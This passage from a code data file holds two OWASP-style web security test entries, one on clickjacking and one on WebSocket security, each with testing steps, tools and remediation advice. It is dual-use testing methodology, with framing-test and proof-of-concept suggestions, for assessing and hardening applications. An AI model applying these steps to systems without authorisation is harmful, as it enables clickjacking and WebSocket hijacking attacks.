      "Verify frame-busting defenses"
    ],
    howToTest: [
      "Create a test page with an iframe loading the target: <iframe src='https://target.com'></iframe>",
      "Check for X-Frame-Options header: should be DENY or SAMEORIGIN",
      "Check for CSP frame-ancestors directive: should restrict framing",
      "Test if JavaScript frame-busting can be bypassed (sandbox attribute on iframe)",
      "Test specific sensitive pages: password change, payment, profile update, permission change",
      "Create a clickjacking PoC with a transparent overlay on top of the framed application",
      "Test with different browsers as frame-busting behavior may vary"
    ],
    tools: ["Browser DevTools", "Custom HTML test pages", "Burp Suite Clickbandit"],
    remediation: "Set X-Frame-Options: DENY or SAMEORIGIN header. Implement CSP frame-ancestors directive. Use SameSite cookie attribute. Require re-authentication for sensitive actions. Do not rely solely on JavaScript frame-busting.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-009", "CWE-1021: Improper Restriction of Rendered UI Layers"],
    severity: "Medium",
    owaspId: "OTG-CLIENT-009"
  },
  {
    id: "OTG-CLIENT-010",
    category: "Client-Side",
    name: "Test WebSockets for Security",
    description: "Test WebSocket connections for authentication, authorization, input validation, and encryption vulnerabilities.",
    objectives: [
      "Check WebSocket authentication and authorization",
      "Test for Cross-Site WebSocket Hijacking (CSWSH)",
      "Verify input validation on WebSocket messages",
      "Ensure WebSocket connections use TLS (wss://)"
    ],
    howToTest: [
      "Check if WebSocket connection uses wss:// (encrypted) or ws:// (plaintext)",
      "Test for CSWSH: create a page on another origin that connects to the WebSocket endpoint",
      "Check if WebSocket handshake validates Origin header",
      "Test for authentication: can you connect to WebSocket without valid session?",
      "Send malicious payloads via WebSocket messages (XSS, SQLi, command injection)",
      "Test for authorization: can you access other users' channels or rooms?",
      "Check for rate limiting on WebSocket messages",
      "Test for message format validation (send unexpected data types, oversized messages)"
    ],
    tools: ["Browser DevTools", "Burp Suite (WebSocket support)", "wscat", "websocat"],
    remediation: "Always use wss:// for WebSocket connections. Validate Origin header during handshake. Require authentication tokens in the handshake or first message. Validate and sanitize all WebSocket message data. Implement rate limiting. Apply same authorization checks as REST endpoints.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-010", "CWE-1385: Missing Origin Validation"],
    severity: "High",
    owaspId: "OTG-CLIENT-010"
  },
];
